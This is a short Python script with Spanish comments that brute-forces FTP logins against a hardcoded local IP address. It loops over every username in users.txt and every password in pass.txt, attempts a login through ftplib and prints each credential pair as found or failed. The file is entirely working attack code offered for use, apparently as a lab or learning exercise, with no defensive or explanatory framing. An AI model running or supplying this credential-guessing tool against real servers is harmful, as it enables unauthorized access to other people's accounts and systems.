#ver si tenemos intalado sistema ftplib
import sys

from ftplib import FTP

# Create FTP object without passing parameters  
ftp = FTP()

def bruteforce(target,user,password):
	ftp=FTP(target)#llamar a la funcion ftp y realiazr una conexion
	
	try:
		ftp.login(user,password)# realizamos la conexion
		print('(+) Se encontro las credenciales =>{}:{}'.format(user,password))# reeamplazon las llaves con el valor de user y password que obtenemos
		
	except:
		print('(+) Fallo las credenciales =>{}:{}'.format(user,password))

	

def main():
	target= "192.168.1.133"
	users=open('users.txt','r')# abrimos  el archiov txt y leemos(r)
	users=users.read().split('\n')#como el datos del arhcivo esta en una columna , el salto de linea cambiamos por el separador , se convierte fila
	passwords=open('pass.txt','r')
	passwords=passwords.read().split('\n')

	for user in users:
		for password in passwords:
			bruteforce(target,user,password)
			

if __name__=='__main__':
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()